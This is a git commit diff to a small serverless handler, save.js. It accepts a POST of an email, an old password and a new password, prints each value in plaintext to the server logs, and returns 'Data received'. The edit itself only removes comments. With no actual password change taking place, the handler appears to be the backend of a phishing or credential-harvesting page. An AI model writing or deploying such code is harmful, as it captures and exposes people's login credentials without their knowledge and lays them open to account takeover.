e0cef8fe09f255c59f239b3c3cc39f5d9a06c781
HitRoling <143625792+HitRoling@users.noreply.github.com>
2025-04-19 11:04:36 +0200

    Update save.js

--- save.js
+++ save.js
@@ -2,15 +2,12 @@ export default function handler(req, res) {
   if (req.method === 'POST') {
     const { email, oldPassword, newPassword } = req.body;
 
-    // Log the data to see it in Vercel logs
     console.log('Email:', email);
     console.log('Old Password:', oldPassword);
     console.log('New Password:', newPassword);
 
-    // Respond back with a success message
-    res.status(200).send('Data received successfully!');
+    res.status(200).send('Data received');
   } else {
-    // Handle unsupported methods
     res.status(405).send('Method Not Allowed');
   }
 }
